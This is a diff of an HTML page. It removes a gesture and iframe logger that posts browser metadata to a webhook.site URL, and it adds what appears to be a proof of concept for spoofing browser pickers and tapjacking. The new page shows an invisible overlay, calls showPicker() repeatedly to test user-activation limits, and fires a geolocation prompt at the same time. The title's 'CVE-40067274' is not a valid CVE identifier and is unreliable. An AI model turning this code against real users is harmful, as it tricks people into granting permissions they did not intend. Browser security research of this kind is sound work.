@@ -1,397 +1,136 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport"
- content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=no">
-
-<title>Chrome iOS Gesture Research</title>
-
-<style>
-* {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-}
-
-body {
-  font-family: Arial, sans-serif;
-  background: #f1f3f4;
-  padding: 20px;
-  color: #202124;
-}
-
-.container {
-  max-width: 480px;
-  margin: auto;
-}
-
-h2 {
-  margin-bottom: 8px;
-}
-
-.description {
-  color: #666;
-  font-size: 13px;
-  margin-bottom: 20px;
-}
-
-.card {
-  background: white;
-  border-radius: 10px;
-  padding: 16px;
-  margin-bottom: 15px;
-  box-shadow: 0 2px 6px #00000012;
-}
-
-button {
-  width: 100%;
-  padding: 18px;
-  border: none;
-  border-radius: 8px;
-  background: #1a73e8;
-  color: white;
-  font-size: 17px;
-  font-weight: bold;
-  margin-top: 12px;
-  cursor: pointer;
-}
-
-button.secondary {
-  background: #188038;
-}
-
-button.gray {
-  background: #5f6368;
-}
-
-.status {
-  font-weight: bold;
-  color: #188038;
-}
-
-#log {
-  background: #111;
-  color: #00e676;
-  font: 11px monospace;
-  padding: 12px;
-  border-radius: 8px;
-  height: 220px;
-  overflow-y: auto;
-  white-space: pre-wrap;
-  overflow-wrap: anywhere;
-}
-
-iframe {
-  width: 100%;
-  height: 120px;
-  border: 2px solid #aaa;
-  border-radius: 6px;
-  background: white;
-}
-
-.small {
-  color: #777;
-  font-size: 12px;
-  margin-top: 8px;
-}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Advanced Heavy-Duty Picker Spoofing Lab (CVE-40067274 Context)</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 40px;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            cursor: pointer;
+            overflow: hidden;
+        }
+        h1 {
+            color: #f85149;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .info-box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 15px;
+            border-radius: 6px;
+            max-width: 550px;
+            width: 100%;
+            font-size: 12px;
+            color: #8b949e;
+            margin-top: 20px;
+            text-align: left;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+        }
+        code { background: #21262d; color: #ff7b72; padding: 2px 5px; border-radius: 3px; }
+        /* Simulasi elemen overlay penutup layar untuk uji lab */
+        #overlay-layer {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.05);
+            z-index: 9999;
+            display: none;
+            pointer-events: none;
+        }
+    </style>
 </head>
-
 <body>
-<div class="container">
 
-  <h2>iOS Gesture Research</h2>
+    <div id="overlay-layer"></div>
 
-  <p class="description">
-    Cross-origin iframe interaction research
-  </p>
+    <h1>⚠️ Heavy-Duty Picker Spoofing Lab</h1>
+    <p style="font-size: 13px; color: #8b949e;">Klik layar untuk menguji ketahanan token aktivasi dan batasan pemanggilan <code>showPicker()</code> berulang.</p>
 
-  <div class="card">
-    <strong>Research status:</strong>
-    <span id="status" class="status">Ready</span>
+    <!-- Elemen Input & Datalist Dinamis -->
+    <input id="target-input" type="time" list="times" style="display:none;" />
+    <datalist id="times">
+        <select id="target-select">
+            <option label="[!] Security Context Validation">00:00</option>
+            <option label="⬇️ Overlay Alignment Test">00:00</option>
+            <option label="⬇️ Tapjacking Simulation">00:00</option>
+            <option label="⭕ Target Zone">00:00</option>
+        </select>
+    </datalist>
 
-    <p class="small" id="browser"></p>
-  </div>
-
-  <div class="card">
-    <h3>Gesture Test</h3>
-
-    <button id="testButton">
-      Click Me - Start Test
-    </button>
-
-    <p class="small">
-      Records trusted user interaction events.
-    </p>
-  </div>
-
-  <div class="card">
-    <h3>Iframe Monitoring</h3>
-
-    <iframe
-      id="researchFrame"
-      title="Local research frame"
-      src="about:blank">
-    </iframe>
-
-    <button class="gray" id="inspectButton">
-      Inspect Iframe
-    </button>
-  </div>
-
-  <div class="card">
-    <h3>Evidence Timeline</h3>
-
-    <div id="log"></div>
-
-    <button class="secondary" id="sendButton">
-      Send Evidence to Webhook
-    </button>
-
-    <button class="gray" id="downloadButton">
-      Download Evidence JSON
-    </button>
-
-    <button class="gray" id="clearButton">
-      Clear Timeline
-    </button>
-
-    <p class="small">
-      Only technical metadata is collected.
-      No authentication credentials are collected.
-    </p>
-  </div>
-
-</div>
+    <div class="info-box" id="log-box">
+        [System] Lab siap. Menunggu gestur klik pengguna...
+    </div>
 
 <script>
-(() => {
-  "use strict";
+    const logBox = document.getElementById('log-box');
+    const overlay = document.getElementById('overlay-layer');
 
-  const WEBHOOK =
-    "https://webhook.site/f1ba82aa-89fc-4c0b-8b44-725f4a5e7177";
-
-  const button =
-    document.getElementById("testButton");
-
-  const frame =
-    document.getElementById("researchFrame");
-
-  const log =
-    document.getElementById("log");
-
-  const status =
-    document.getElementById("status");
-
-  const evidence = [];
-
-  function record(event, details = {}) {
-    const entry = {
-      event,
-      timestamp: new Date().toISOString(),
-      details
-    };
-
-    evidence.push(entry);
-
-    const line = JSON.stringify(entry);
-
-    log.textContent += line + "\n";
-    log.scrollTop = log.scrollHeight;
-
-    console.log("[RESEARCH]", entry);
-  }
-
-  document.getElementById("browser").textContent =
-    navigator.userAgent;
-
-  record("research_initialized", {
-    platform: navigator.platform,
-    viewport: {
-      width: innerWidth,
-      height: innerHeight
-    },
-    screen: {
-      width: screen.width,
-      height: screen.height
+    function appendLog(msg, isError = false) {
+        const timeStr = new Date().toISOString().split('T')[1].slice(0, 12);
+        console.log(`[${timeStr}] ${msg}`);
+        logBox.innerHTML += `<br><span style="color: ${isError ? '#f85149' : '#52bef8'}">[${timeStr}]</span> ${msg}`;
+        logBox.scrollTop = logBox.scrollHeight;
     }
-  });
 
-  // Monitor trusted gesture events.
-  [
-    "touchstart",
-    "touchend",
-    "pointerdown",
-    "pointerup",
-    "click"
-  ].forEach(type => {
-    document.addEventListener(type, event => {
-      record("gesture_" + type, {
-        target: event.target?.tagName,
-        trusted: event.isTrusted,
-        timeStamp: event.timeStamp
-      });
-    }, true);
-  });
-
-  // Monitor iframe loading.
-  frame.addEventListener("load", () => {
-    record("iframe_loaded", {
-      src: frame.getAttribute("src")
-    });
-  });
-
-  // Monitor iframe style changes.
-  const observer = new MutationObserver(() => {
-    const style = getComputedStyle(frame);
-
-    record("iframe_style_changed", {
-      opacity: style.opacity,
-      pointerEvents: style.pointerEvents,
-      visibility: style.visibility,
-      display: style.display
-    });
-  });
-
-  observer.observe(frame, {
-    attributes: true,
-    attributeFilter: ["style"]
-  });
-
-  // Do not process credential-bearing messages.
-  window.addEventListener("message", event => {
-    record("postmessage_metadata", {
-      origin: event.origin,
-      sourceIsFrame:
-        event.source === frame.contentWindow,
-      dataType: typeof event.data
-    });
-  });
-
-  // Start local test.
-  button.addEventListener("click", () => {
-    status.textContent = "Gesture recorded";
-
-    record("test_button_activated", {
-      trusted: true
-    });
-  });
-
-  // Inspect iframe configuration.
-  document.getElementById("inspectButton")
-    .addEventListener("click", () => {
-      const style = getComputedStyle(frame);
-
-      record("iframe_inspection", {
-        opacity: style.opacity,
-        pointerEvents: style.pointerEvents,
-        visibility: style.visibility,
-        display: style.display,
-        width: frame.clientWidth,
-        height: frame.clientHeight
-      });
-    });
-
-  // Build report.
-  function buildReport() {
-    return {
-      research: "ios-iframe-gesture-research",
-      version: "1.0",
-      timestamp: new Date().toISOString(),
-      browser: navigator.userAgent,
-      platform: navigator.platform,
-      viewport: {
-        width: innerWidth,
-        height: innerHeight
-      },
-      events: evidence
-    };
-  }
-
-  // Send evidence.
-  document.getElementById("sendButton")
-    .addEventListener("click", async () => {
-
-      status.textContent = "Sending report...";
-
-      const report = buildReport();
-
-      try {
-        const response = await fetch(WEBHOOK, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(report)
-        });
-
-        if (!response.ok) {
-          throw new Error("HTTP " + response.status);
+    function triggerPickerAttempt(index) {
+        try {
+            const inputEl = document.getElementById('target-input');
+            
+            // Penguatan: Memaksa pemanggilan metode showPicker secara langsung
+            inputEl.showPicker();
+            appendLog(`Sukses: showPicker() tereksekusi pada iterasi ke-${index}`);
+        } catch (err) {
+            appendLog(`Ditolak/Diblokir (Iterasi ${index}): ${err.name} - ${err.message}`, true);
         }
+    }
 
-        status.textContent = "Report submitted";
+    document.body.onclick = async () => {
+        appendLog("Gestur klik terdeteksi (User Activation Sah). Memulai rangkaian uji...");
+        
+        // Mengaktifkan elemen overlay simulasi visual lab
+        overlay.style.display = 'block';
 
-        record("webhook_submission_success", {
-          httpStatus: response.status
-        });
+        // Percobaan 1: Eksekusi instan di dalam siklus microtask / stack awal
+        triggerPickerAttempt(1);
 
-      } catch (error) {
-        status.textContent = "Webhook failed";
+        // Percobaan 2: Pemanfaatan interval berkecepatan tinggi untuk menguji pembatasan ConsumeIfActive
+        let counter = 2;
+        const stressInterval = setInterval(() => {
+            triggerPickerAttempt(counter);
+            counter++;
 
-        record("webhook_submission_failed", {
-          error: String(error)
-        });
-      }
-    });
+            // Batasi hingga 8 kali percobaan agresif dalam rentang waktu singkat
+            if (counter > 8) {
+                clearInterval(stressInterval);
+                appendLog("Uji stres interval selesai. Perhatikan penolakan NotAllowedError di atas.");
+                overlay.style.display = 'none';
+            }
+        }, 100);
 
-  // Download evidence.
-  document.getElementById("downloadButton")
-    .addEventListener("click", () => {
-
-      const blob = new Blob(
-        [JSON.stringify(buildReport(), null, 2)],
-        { type: "application/json" }
-      );
-
-      const url = URL.createObjectURL(blob);
-      const link = document.createElement("a");
-
-      link.href = url;
-      link.download = "ios-gesture-evidence.json";
-      link.click();
-
-      URL.revokeObjectURL(url);
-
-      record("evidence_downloaded");
-    });
-
-  // Clear timeline.
-  document.getElementById("clearButton")
-    .addEventListener("click", () => {
-      evidence.length = 0;
-      log.textContent = "";
-      status.textContent = "Timeline cleared";
-
-      record("timeline_reset");
-    });
-
-  document.addEventListener("visibilitychange", () => {
-    record("visibility_changed", {
-      state: document.visibilityState
-    });
-  });
-
-  window.addEventListener("focus", () => {
-    record("window_focus");
-  });
-
-  window.addEventListener("blur", () => {
-    record("window_blur");
-  });
-
-})();
+        // Memicu dialog izin sistem secara asinkron paralel
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => { appendLog("Callback Geolokasi: Diizinkan (" + pos.coords.latitude + ")"); },
+                (err) => { appendLog("Callback Geolokasi: Ditolak/Error (" + err.message + ")", true); }
+            );
+        } catch (e) {
+            appendLog("Error pada pemanggilan geolocation: " + e.message, true);
+        }
+    };
 </script>
+
 </body>
 </html>
